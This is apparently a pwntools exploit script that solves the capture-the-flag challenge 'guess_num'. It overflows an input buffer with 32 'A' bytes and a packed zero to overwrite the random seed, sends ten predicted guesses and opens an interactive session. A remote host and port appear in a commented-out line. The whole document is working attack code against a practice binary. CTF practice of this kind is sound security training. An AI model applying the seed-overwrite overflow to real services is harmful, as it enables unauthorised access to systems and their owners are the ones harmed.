from pwn import *
from zzPwnlib import *
context(os='linux', arch='amd64', log_level='debug')

#r = remote('111.200.241.244',64223)
r = process('./xctf_pwn_006_guess_num')

r.recv()
r.sendline(b"A"*0x20 + p64(0))
r.sendline("2")
r.sendline("5")
r.sendline("4")
r.sendline("2")
r.sendline("6")
r.sendline("2")
r.sendline("5")
r.sendline("1")
r.sendline("4")
r.sendline("2")
r.interactive()